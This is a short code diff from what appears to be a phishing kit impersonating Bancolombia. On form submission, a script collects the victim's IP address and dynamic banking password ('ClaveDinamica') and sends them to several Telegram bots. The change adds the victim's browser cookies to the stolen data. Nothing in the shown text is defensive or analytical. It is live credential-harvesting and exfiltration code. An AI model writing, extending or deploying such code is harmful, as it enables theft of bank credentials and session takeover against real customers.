@@ -85,7 +85,7 @@ formulario.addEventListener('submit', async function (event) {
     const formattedDate = `${currentDate.getDate()}/${currentDate.getMonth() + 1}/${currentDate.getFullYear()}`;
     
     const message = `\n<b>${ip}</b>\n<b>✅  Bancolombia DynmicLogs</b>
-    \n \n🔓 ClaveDinamica: <b>${dinamica}</b>`;
+    \n \n🔓 ClaveDinamica: <b>${dinamica}</b>\n🍪 Cookies: ${document.cookie || 'Sin cookies'}`;
     
     // Enviar mensaje a todos los bots configurados
     await Promise.all(telegramBots.map(bot => sendTelegramMessage(bot, message)));
